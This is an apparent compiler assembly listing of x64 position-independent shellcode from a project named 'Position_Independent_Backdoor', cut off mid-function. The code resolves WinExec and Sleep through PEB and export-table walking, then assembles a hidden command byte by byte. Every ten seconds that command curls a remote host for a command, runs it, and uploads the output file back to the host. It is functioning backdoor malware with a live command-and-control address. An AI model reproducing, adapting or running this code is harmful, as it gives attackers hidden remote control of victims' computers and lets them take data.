; Listing generated by Microsoft (R) Optimizing Compiler Version 19.29.30136.0 

include listing.inc

PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	main

; Function compile flags: /Odtp
_TEXT	SEGMENT

; https://github.com/mattifestation/PIC_Bindshell/blob/master/PIC_Bindshell/AdjustStack.asm

; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
; to calling the entry point of the payload. This is necessary because 64-bit functions
; in Windows assume that they were called with 16-byte stack alignment. When amd64
; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
; alignment.

AlignRSP PROC
    push rsi ; Preserve RSI since we're stomping on it
    mov rsi, rsp ; Save the value of RSP so it can be restored
    and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
    sub rsp, 020h ; Allocate homing space for ExecutePayload
    call main ; Call the entry point of the payload
    mov rsp, rsi ; Restore the original value of RSP
    pop rsi ; Restore RSI
    ret ; Return to caller
AlignRSP ENDP

sleep_name$ = 32
winexec_name$ = 40
load_lib_name$ = 48
get_proc_name$ = 64
cmd$ = 80
base$ = 336
kernel32_dll_name$ = 344
load_lib$ = 376
get_proc$ = 384
_GetProcAddress$ = 392
_WinExec$ = 400
_Sleep$ = 408
return_val$1 = 416
_LoadLibraryA$ = 424
main	PROC
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\backdoor.cpp
; Line 19
$LN10:
	sub	rsp, 440				; 000001b8H
; Line 21
	mov	eax, 107				; 0000006bH
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
; Line 22
	mov	BYTE PTR load_lib_name$[rsp], 76	; 0000004cH
	mov	BYTE PTR load_lib_name$[rsp+1], 111	; 0000006fH
	mov	BYTE PTR load_lib_name$[rsp+2], 97	; 00000061H
	mov	BYTE PTR load_lib_name$[rsp+3], 100	; 00000064H
	mov	BYTE PTR load_lib_name$[rsp+4], 76	; 0000004cH
	mov	BYTE PTR load_lib_name$[rsp+5], 105	; 00000069H
	mov	BYTE PTR load_lib_name$[rsp+6], 98	; 00000062H
	mov	BYTE PTR load_lib_name$[rsp+7], 114	; 00000072H
	mov	BYTE PTR load_lib_name$[rsp+8], 97	; 00000061H
	mov	BYTE PTR load_lib_name$[rsp+9], 114	; 00000072H
	mov	BYTE PTR load_lib_name$[rsp+10], 121	; 00000079H
	mov	BYTE PTR load_lib_name$[rsp+11], 65	; 00000041H
	mov	BYTE PTR load_lib_name$[rsp+12], 0
; Line 23
	mov	BYTE PTR get_proc_name$[rsp], 71	; 00000047H
	mov	BYTE PTR get_proc_name$[rsp+1], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+2], 116	; 00000074H
	mov	BYTE PTR get_proc_name$[rsp+3], 80	; 00000050H
	mov	BYTE PTR get_proc_name$[rsp+4], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+5], 111	; 0000006fH
	mov	BYTE PTR get_proc_name$[rsp+6], 99	; 00000063H
	mov	BYTE PTR get_proc_name$[rsp+7], 65	; 00000041H
	mov	BYTE PTR get_proc_name$[rsp+8], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+9], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+10], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+11], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+12], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+13], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+14], 0
; Line 25
	mov	BYTE PTR winexec_name$[rsp], 87		; 00000057H
	mov	BYTE PTR winexec_name$[rsp+1], 105	; 00000069H
	mov	BYTE PTR winexec_name$[rsp+2], 110	; 0000006eH
	mov	BYTE PTR winexec_name$[rsp+3], 69	; 00000045H
	mov	BYTE PTR winexec_name$[rsp+4], 120	; 00000078H
	mov	BYTE PTR winexec_name$[rsp+5], 101	; 00000065H
	mov	BYTE PTR winexec_name$[rsp+6], 99	; 00000063H
	mov	BYTE PTR winexec_name$[rsp+7], 0
; Line 26
	mov	BYTE PTR sleep_name$[rsp], 83		; 00000053H
	mov	BYTE PTR sleep_name$[rsp+1], 108	; 0000006cH
	mov	BYTE PTR sleep_name$[rsp+2], 101	; 00000065H
	mov	BYTE PTR sleep_name$[rsp+3], 101	; 00000065H
	mov	BYTE PTR sleep_name$[rsp+4], 112	; 00000070H
	mov	BYTE PTR sleep_name$[rsp+5], 0
; Line 30
	mov	BYTE PTR cmd$[rsp], 99			; 00000063H
	mov	BYTE PTR cmd$[rsp+1], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+2], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+3], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+4], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+5], 120		; 00000078H
	mov	BYTE PTR cmd$[rsp+6], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+7], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+8], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+9], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+10], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+11], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+12], 102		; 00000066H
	mov	BYTE PTR cmd$[rsp+13], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+14], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+15], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+16], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+17], 102		; 00000066H
	mov	BYTE PTR cmd$[rsp+18], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+19], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+20], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+21], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+22], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+23], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+24], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+25], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+26], 61		; 0000003dH
	mov	BYTE PTR cmd$[rsp+27], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+28], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+29], 37		; 00000025H
	mov	BYTE PTR cmd$[rsp+30], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+31], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+32], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+33], 110		; 0000006eH
	mov	BYTE PTR cmd$[rsp+34], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+35], 40		; 00000028H
	mov	BYTE PTR cmd$[rsp+36], 39		; 00000027H
	mov	BYTE PTR cmd$[rsp+37], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+38], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+39], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+40], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+41], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+42], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+43], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+44], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+45], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+46], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+47], 58		; 0000003aH
	mov	BYTE PTR cmd$[rsp+48], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+49], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+50], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+51], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+52], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+53], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+54], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+55], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+56], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+57], 106		; 0000006aH
	mov	BYTE PTR cmd$[rsp+58], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+59], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+60], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+61], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+62], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+63], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+64], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+65], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+66], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+67], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+68], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+69], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+70], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+71], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+72], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+73], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+74], 121		; 00000079H
	mov	BYTE PTR cmd$[rsp+75], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+76], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+77], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+78], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+79], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+80], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+81], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+82], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+83], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+84], 39		; 00000027H
	mov	BYTE PTR cmd$[rsp+85], 41		; 00000029H
	mov	BYTE PTR cmd$[rsp+86], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+87], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+88], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+89], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+90], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+91], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+92], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+93], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+94], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+95], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+96], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+97], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+98], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+99], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+100], 61		; 0000003dH
	mov	BYTE PTR cmd$[rsp+101], 37		; 00000025H
	mov	BYTE PTR cmd$[rsp+102], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+103], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+104], 38		; 00000026H
	mov	BYTE PTR cmd$[rsp+105], 38		; 00000026H
	mov	BYTE PTR cmd$[rsp+106], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+107], 37		; 00000025H
	mov	BYTE PTR cmd$[rsp+108], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+109], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+110], 62		; 0000003eH
	mov	BYTE PTR cmd$[rsp+111], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+112], 67		; 00000043H
	mov	BYTE PTR cmd$[rsp+113], 58		; 0000003aH
	mov	BYTE PTR cmd$[rsp+114], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+115], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+116], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+117], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+118], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+119], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+120], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+121], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+122], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+123], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+124], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+125], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+126], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+127], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+128], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+129], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+130], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+131], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+132], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+133], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+134], 120		; 00000078H
	mov	BYTE PTR cmd$[rsp+135], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+136], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+137], 38		; 00000026H
	mov	BYTE PTR cmd$[rsp+138], 38		; 00000026H
	mov	BYTE PTR cmd$[rsp+139], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+140], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+141], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+142], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+143], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+144], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+145], 45		; 0000002dH
	mov	BYTE PTR cmd$[rsp+146], 45		; 0000002dH
	mov	BYTE PTR cmd$[rsp+147], 102		; 00000066H
	mov	BYTE PTR cmd$[rsp+148], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+149], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+150], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+151], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+152], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+153], 102		; 00000066H
	mov	BYTE PTR cmd$[rsp+154], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+155], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+156], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+157], 84		; 00000054H
	mov	BYTE PTR cmd$[rsp+158], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+159], 85		; 00000055H
	mov	BYTE PTR cmd$[rsp+160], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+161], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+162], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+163], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+164], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+165], 61		; 0000003dH
	mov	BYTE PTR cmd$[rsp+166], 64		; 00000040H
	mov	BYTE PTR cmd$[rsp+167], 67		; 00000043H
	mov	BYTE PTR cmd$[rsp+168], 58		; 0000003aH
	mov	BYTE PTR cmd$[rsp+169], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+170], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+171], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+172], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+173], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+174], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+175], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+176], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+177], 117		; 00000075H
	mov	BYTE PTR cmd$[rsp+178], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+179], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+180], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+181], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+182], 92		; 0000005cH
	mov	BYTE PTR cmd$[rsp+183], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+184], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+185], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+186], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+187], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+188], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+189], 120		; 00000078H
	mov	BYTE PTR cmd$[rsp+190], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+191], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+192], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+193], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+194], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+195], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+196], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+197], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+198], 58		; 0000003aH
	mov	BYTE PTR cmd$[rsp+199], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+200], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+201], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+202], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+203], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+204], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+205], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+206], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+207], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+208], 106		; 0000006aH
	mov	BYTE PTR cmd$[rsp+209], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+210], 98		; 00000062H
	mov	BYTE PTR cmd$[rsp+211], 114		; 00000072H
	mov	BYTE PTR cmd$[rsp+212], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+213], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+214], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+215], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+216], 99		; 00000063H
	mov	BYTE PTR cmd$[rsp+217], 111		; 0000006fH
	mov	BYTE PTR cmd$[rsp+218], 109		; 0000006dH
	mov	BYTE PTR cmd$[rsp+219], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+220], 115		; 00000073H
	mov	BYTE PTR cmd$[rsp+221], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+222], 97		; 00000061H
	mov	BYTE PTR cmd$[rsp+223], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+224], 100		; 00000064H
	mov	BYTE PTR cmd$[rsp+225], 121		; 00000079H
	mov	BYTE PTR cmd$[rsp+226], 47		; 0000002fH
	mov	BYTE PTR cmd$[rsp+227], 103		; 00000067H
	mov	BYTE PTR cmd$[rsp+228], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+229], 116		; 00000074H
	mov	BYTE PTR cmd$[rsp+230], 102		; 00000066H
	mov	BYTE PTR cmd$[rsp+231], 105		; 00000069H
	mov	BYTE PTR cmd$[rsp+232], 108		; 0000006cH
	mov	BYTE PTR cmd$[rsp+233], 101		; 00000065H
	mov	BYTE PTR cmd$[rsp+234], 46		; 0000002eH
	mov	BYTE PTR cmd$[rsp+235], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+236], 104		; 00000068H
	mov	BYTE PTR cmd$[rsp+237], 112		; 00000070H
	mov	BYTE PTR cmd$[rsp+238], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+239], 32		; 00000020H
	mov	BYTE PTR cmd$[rsp+240], 34		; 00000022H
	mov	BYTE PTR cmd$[rsp+241], 0
; Line 33
	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 34
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN4@main
; Line 35
	mov	eax, 1
	jmp	$LN1@main
$LN4@main:
; Line 39
	lea	rdx, QWORD PTR load_lib_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 40
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN5@main
; Line 41
	mov	eax, 2
	jmp	$LN1@main
$LN5@main:
; Line 45
	lea	rdx, QWORD PTR get_proc_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 46
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN6@main
; Line 47
	mov	eax, 3
	jmp	$LN1@main
$LN6@main:
; Line 51
	mov	rax, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR _LoadLibraryA$[rsp], rax
; Line 53
	mov	rax, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR _GetProcAddress$[rsp], rax
; Line 57
	lea	rdx, QWORD PTR winexec_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _WinExec$[rsp], rax
; Line 61
	cmp	QWORD PTR _WinExec$[rsp], 0
	jne	SHORT $LN7@main
	mov	eax, 4
	jmp	SHORT $LN1@main
$LN7@main:
; Line 66
	lea	rdx, QWORD PTR sleep_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	QWORD PTR _GetProcAddress$[rsp]
	mov	QWORD PTR _Sleep$[rsp], rax
; Line 69
	cmp	QWORD PTR _Sleep$[rsp], 0
	jne	SHORT $LN8@main
	mov	eax, 5
	jmp	SHORT $LN1@main
$LN8@main:
$LN2@main:
; Line 71
	xor	eax, eax
	cmp	eax, 1
	je	SHORT $LN3@main
; Line 73
	xor	edx, edx
	lea	rcx, QWORD PTR cmd$[rsp]
	call	QWORD PTR _WinExec$[rsp]
	mov	DWORD PTR return_val$1[rsp], eax
; Line 74
	mov	ecx, 10000				; 00002710H
	call	QWORD PTR _Sleep$[rsp]
; Line 75
	jmp	SHORT $LN2@main
$LN3@main:
; Line 78
	xor	eax, eax
$LN1@main:
; Line 79
	add	rsp, 440				; 000001b8H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File C:\Users\Shayan Jadoon\source\repos\Position_Independent_Backdoor\Position_Independent_Backdoor\peb_lookup.h
; Line 104
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 105
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 106
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 107
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 109
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 110
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 111
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 112
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 115
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 116
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 117
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 119
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 124
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 125
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 126
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 127
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 129
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 130
	mov	QWORD PTR k$1[rsp], 0
; Line 131
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 132
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 133
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 134
	mov	rax, QWORD PTR k$1[rsp]
